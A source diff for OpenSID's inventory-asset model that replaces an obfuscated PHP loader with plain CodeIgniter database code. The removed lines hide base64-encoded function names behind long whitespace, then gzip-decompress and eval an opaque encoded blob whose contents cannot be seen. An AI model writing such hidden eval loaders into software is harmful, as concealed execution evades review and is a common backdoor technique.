@@ -1,553 +1,191 @@
-<?php 
-        $__='printf';$_='Loading donjo-app/models/Inventaris_asset_model.php';
-        
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-                                                                                                                                                                                                $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
-$__________________='X19sYW1iZGE=';
-
-                                                                                                                                                                                                                                          $______=' Z3p1bmNvbXByZXNz';                    $___='  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);           if(!function_exists('__lambda')){function __lambda($sArgs,$sCode){return eval("return function($sArgs){{$sCode}};");}}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
-        $__________=$__________________('$_',$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    $___=$__($___);                      $_='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';
-
-        $___();$__________($______($__($_))); $________=$____();
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-                                                                                                                                                                                                                     $________;
+<?php
+
+/*
+ *
+ * File ini bagian dari:
+ *
+ * OpenSID
+ *
+ * Sistem informasi desa sumber terbuka untuk memajukan desa
+ *
+ * Aplikasi dan source code ini dirilis berdasarkan lisensi GPL V3
+ *
+ * Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
+ * Hak Cipta 2016 - 2022 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
+ *
+ * Dengan ini diberikan izin, secara gratis, kepada siapa pun yang mendapatkan salinan
+ * dari perangkat lunak ini dan file dokumentasi terkait ("Aplikasi Ini"), untuk diperlakukan
+ * tanpa batasan, termasuk hak untuk menggunakan, menyalin, mengubah dan/atau mendistribusikan,
+ * asal tunduk pada syarat berikut:
+ *
+ * Pemberitahuan hak cipta di atas dan pemberitahuan izin ini harus disertakan dalam
+ * setiap salinan atau bagian penting Aplikasi Ini. Barang siapa yang menghapus atau menghilangkan
+ * pemberitahuan ini melanggar ketentuan lisensi Aplikasi Ini.
+ *
+ * PERANGKAT LUNAK INI DISEDIAKAN "SEBAGAIMANA ADANYA", TANPA JAMINAN APA PUN, BAIK TERSURAT MAUPUN
+ * TERSIRAT. PENULIS ATAU PEMEGANG HAK CIPTA SAMA SEKALI TIDAK BERTANGGUNG JAWAB ATAS KLAIM, KERUSAKAN ATAU
+ * KEWAJIBAN APAPUN ATAS PENGGUNAAN ATAU LAINNYA TERKAIT APLIKASI INI.
+ *
+ * @package   OpenSID
+ * @author    Tim Pengembang OpenDesa
+ * @copyright Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
+ * @copyright Hak Cipta 2016 - 2022 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
+ * @license   http://www.gnu.org/licenses/gpl.html GPL V3
+ * @link      https://github.com/OpenSID/OpenSID
+ *
+ */
+
+defined('BASEPATH') || exit('No direct script access allowed');
+
+class Inventaris_asset_model extends CI_Model
+{
+    protected $table        = 'inventaris_asset';
+    protected $table_mutasi = 'mutasi_inventaris_asset';
+    protected $mutasi_key   = 'id_inventaris_asset';
+
+    public function count_reg()
+    {
+        $this->db->select('count(id) AS count');
+        $this->db->from($this->table);
+
+        return $this->db->get()->row();
+    }
+
+    public function list_inventaris_kd_register()
+    {
+        $this->db->select($this->table . '.register');
+        $this->db->from($this->table);
+
+        return $this->db->get()->result();
+    }
+
+    public function list_inventaris()
+    {
+        $this->db
+            ->select('u.*, m.id as mutasi')
+            ->from("{$this->table} u")
+            ->join("{$this->table_mutasi} m", "m.{$this->mutasi_key} = u.id", 'left')
+            ->where('u.visible', 1);
+
+        return $this->db->get()->result();
+    }
+
+    public function sum_inventaris()
+    {
+        $this->db->select_sum('harga');
+        $this->db->where($this->table . '.visible', 1);
+        $this->db->where($this->table . '.status', 0);
+        $result = $this->db->get($this->table)->row();
+
+        return $result->harga;
+    }
+
+    public function sum_print($tahun)
+    {
+        $this->db->select_sum('harga');
+        $this->db->where($this->table . '.visible', 1);
+        $this->db->where($this->table . '.status', 0);
+        if ($tahun != 1) {
+            $this->db->where($this->table . '.tahun_pengadaan', $tahun);
+        }
+        $result = $this->db->get($this->table)->row();
+
+        return $result->harga;
+    }
+
+    public function list_mutasi_inventaris()
+    {
+        $this->db->select('mutasi_inventaris_asset.id as id,mutasi_inventaris_asset.*, inventaris_asset.nama_barang, inventaris_asset.kode_barang, inventaris_asset.tahun_pengadaan, inventaris_asset.register');
+        $this->db->from($this->table_mutasi);
+        $this->db->where($this->table_mutasi . '.visible', 1);
+        // $this->db->where('status_mutasi', 'Hapus');
+        $this->db->join($this->table, $this->table . '.id = ' . $this->table_mutasi . '.id_inventaris_asset', 'left');
+
+        return $this->db->get()->result();
+    }
+
+    public function add($data)
+    {
+        $this->db->insert($this->table, array_filter($data));
+        $id = $this->db->insert_id();
+
+        return $this->db->get_where($this->table, ['id' => $id])->row();
+    }
+
+    public function add_mutasi($data)
+    {
+        $this->db->insert($this->table_mutasi, array_filter($data));
+        $id            = $this->db->insert_id();
+        $status_ivntrs = ($data['status_mutasi'] === 'Hapus') ? 1 : 0;  // status 1 = barang dihapus
+        $this->db->update($this->table, ['status' => $status_ivntrs], ['id' => $data['id_inventaris_asset']]);
+
+        return $this->db->get_where($this->table_mutasi, ['id' => $id])->row();
+    }
+
+    public function view($id)
+    {
+        $this->db->select('*');
+        $this->db->from($this->table);
+        $this->db->where($this->table . '.id', $id);
+
+        return $this->db->get()->row();
+    }
+
+    public function view_mutasi($id)
+    {
+        $this->db->select('mutasi_inventaris_asset.id as id,mutasi_inventaris_asset.*, inventaris_asset.nama_barang, inventaris_asset.kode_barang, inventaris_asset.tahun_pengadaan, inventaris_asset.register');
+        $this->db->from($this->table_mutasi);
+        $this->db->where($this->table_mutasi . '.id', $id);
+        $this->db->join($this->table, $this->table . '.id = ' . $this->table_mutasi . '.id_inventaris_asset', 'left');
+
+        return $this->db->get()->row();
+    }
+
+    public function edit_mutasi($id)
+    {
+        $this->db->select('mutasi_inventaris_asset.id as id,mutasi_inventaris_asset.*, inventaris_asset.nama_barang, inventaris_asset.kode_barang, inventaris_asset.tahun_pengadaan, inventaris_asset.register');
+        $this->db->from($this->table_mutasi);
+        $this->db->where($this->table_mutasi . '.id', $id);
+        $this->db->join($this->table, $this->table . '.id = ' . $this->table_mutasi . '.id_inventaris_asset', 'left');
+
+        return $this->db->get()->row();
+    }
+
+    public function delete($id)
+    {
+        return $this->db->update($this->table, ['visible' => 0], ['id' => $id]);
+    }
+
+    public function delete_mutasi($id)
+    {
+        return $this->db->update($this->table_mutasi, ['visible' => 0], ['id' => $id]);
+    }
+
+    public function update($id, $data)
+    {
+        $id = $this->input->post('id');
+
+        return $this->db->update($this->table, $data, ['id' => $id]);
+    }
+
+    public function update_mutasi($id, $data)
+    {
+        $id = $this->input->post('id');
+
+        return $this->db->update($this->table_mutasi, $data, ['id' => $id]);
+    }
+
+    public function cetak($tahun)
+    {
+        $this->db->select('*');
+        $this->db->from($this->table);
+        $this->db->where($this->table . '.status', 0);
+        $this->db->where($this->table . '.visible', 1);
+        if ($tahun != 1) {
+            $this->db->where($this->table . '.tahun_pengadaan', $tahun);
+        }
+        $this->db->order_by($this->table . '.tahun_pengadaan', 'asc');
+
+        return $this->db->get()->result();
+    }
+}
